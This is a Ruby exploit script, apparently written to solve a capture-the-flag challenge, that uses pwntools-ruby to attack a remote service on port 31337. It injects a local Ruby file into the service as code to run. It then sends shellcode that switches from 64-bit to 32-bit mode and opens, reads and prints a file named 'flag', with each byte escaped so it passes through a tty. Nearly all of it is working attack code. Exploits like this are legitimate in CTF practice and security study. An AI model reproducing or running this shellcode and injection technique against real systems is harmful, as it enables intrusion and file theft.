#!/usr/bin/env ruby
# encoding: ascii-8bit
require 'pry'
require 'pwn'        # https://github.com/peter50216/pwntools-ruby
require 'heapinfo'   # https://github.com/david942j/heapinfo
require 'one_gadget' # https://github.com/david942j/one_gadget

tty = true
host, port = (ARGV.first || ''), 31337
@local = false
if ARGV.empty?
  host = '127.0.0.1'; @local = true
else
  raise ArgumentError, 'host not set' if host.empty?
end
$z = Sock.new host, port
def z;$z;end
@p = ''
def h;@h ||= heapinfo(@p);end
def elf; @elf ||= ELF.new(@p); end
#================= Exploit Start ====================
context.arch = 'amd64' 
# context.log_level = :debug

z.puts '$stdin.binmode'
lines = IO.binread('a.rb').lines.map do |c|
  next if c.strip.start_with?('#')
  c
end
payload = lines.join.gsub("\n", ';')
z.puts payload
sleep(1)
payload = asm(<<-EOS
  mov rsp, 0xc0d3800
  jmp go
change:
  mov dword ptr [esp+4], 0x23
  retf
go:
  call change
    EOS
) + context.local(arch: 'i386') {
  asm(
    shellcraft.pushstr('flag') +
    shellcraft.syscall('SYS_open', 'esp', 0) +
    shellcraft.syscall('SYS_read', 'eax', 'esp', 4096) +
    shellcraft.syscall('SYS_write', 1, 'esp', 'eax') +
    shellcraft.syscall('SYS_exit', 0)
  )
}
payload = payload.bytes.map{|v|[0x16,v]}.flatten.pack("C*") if tty
z.puts payload
z.interact rescue puts(Rainbow('[EOF]').red)
